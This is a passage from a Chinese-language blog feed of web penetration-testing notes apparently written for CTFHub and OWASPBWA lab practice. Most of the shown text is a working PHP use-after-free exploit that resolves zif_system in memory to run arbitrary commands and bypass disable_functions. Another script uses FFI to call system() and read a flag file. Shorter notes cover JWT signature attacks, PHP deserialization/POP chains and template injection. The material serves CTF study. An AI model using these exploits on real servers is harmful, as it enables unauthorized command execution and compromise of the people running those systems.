&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="17-8-FFI-扩展"><a href="#17-8-FFI-扩展" class="headerlink" title="17.8  FFI 扩展"></a>17.8  FFI 扩展</h2><blockquote><p>PHP &gt;= 7.4<br>开启了 FFI 扩展且 ffi.enable=true </p></blockquote><p>方法一：蚁剑插件PHP74_FFI</p><p>方法二：脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;tac /flag &gt; /tmp/hack&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/tmp/hack&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;/tmp/hack&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="17-9-iconv"><a href="#17-9-iconv" class="headerlink" title="17.9 iconv"></a>17.9 iconv</h2><p>蚁剑方法同11.4</p><h1 id="18-JSON-Web-Token"><a href="#18-JSON-Web-Token" class="headerlink" title="18. JSON Web Token"></a>18. JSON Web Token</h1><p>认识JWT：<a href="https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob">https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob</a></p><p>以下writeup看：<a href="https://blog.csdn.net/qq_46150940/article/details/113440680">https://blog.csdn.net/qq_46150940/article/details/113440680</a></p><h2 id="18-1-无签名"><a href="#18-1-无签名" class="headerlink" title="18.1 无签名"></a>18.1 无签名</h2><p>一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。 </p><h2 id="18-2-弱密钥"><a href="#18-2-弱密钥" class="headerlink" title="18.2 弱密钥"></a>18.2 弱密钥</h2><p>如果JWT采用对称加密算法，并且密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥。 </p><h2 id="18-3-修改签名算法"><a href="#18-3-修改签名算法" class="headerlink" title="18.3 修改签名算法"></a>18.3 修改签名算法</h2><p>有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。 </p><h1 id="19-PHP"><a href="#19-PHP" class="headerlink" title="19. PHP"></a>19. PHP</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">处理错误看日志，学习用法读文档</span><br></pre></td></tr></table></figure><p>WAMP-Windows Apache MySQL PHP</p><p>LAMP-Linux Apache MySQL PHP</p><p>echo/print</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo-可以输出一个或多个字符串，没有返回值</span><br><span class="line">print-只允许输出一个字符串(但可以用.连接字符串)，返回值总为1</span><br><span class="line">echo输出速度比print快</span><br><span class="line">echo &#x27;hh&#x27;,&#x27;aa&#x27;;</span><br><span class="line">print &#x27;hh&#x27;.&#x27;aa&#x27;;</span><br></pre></td></tr></table></figure><p>松散比较==，只比较值，不比较类型</p><p>严格比较===，比较值和类型</p><h2 id="19-1-序列化与反序列化"><a href="#19-1-序列化与反序列化" class="headerlink" title="19.1 序列化与反序列化"></a>19.1 序列化与反序列化</h2><p>序列化/反序列化 给我们传递对象提供了一种简单的办法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">serialize()将一个对象转化成一个字符串</span><br><span class="line">unserialize()将字符串还原为一个对象</span><br></pre></td></tr></table></figure><p>反序列化与POP链(Property-Oriented Programing)</p><p>与二进制的ROP(Return-Oriented Programing)原理相似，从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。</p><p>__toString()触发条件：</p><ol><li>echo($obj)/print($obj)</li><li>字符串连接时</li><li>格式化字符串时</li><li>与字符串进行\==比较时(PHP进行==比较时会转换参数类型)</li><li>格式化SQL语句，绑定参数时</li><li>数组中有字符串时</li></ol><h1 id="20-模板注入"><a href="#20-模板注入" class="headerlink" title="20. 模板注入"></a>20. 模板注入</h1><p>SSTI(Server-side temple injection)服务端模板注入</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;文章知识点建立在OWASPBWA靶机与CTFHub实验的基础上。&lt;/p&gt;
&lt;p&gt;总实验准备：&lt;/p&gt;
&lt;p&gt;kali虚拟机、OWASPBWA靶机、win10、XShell&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞渗透" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
</feed>
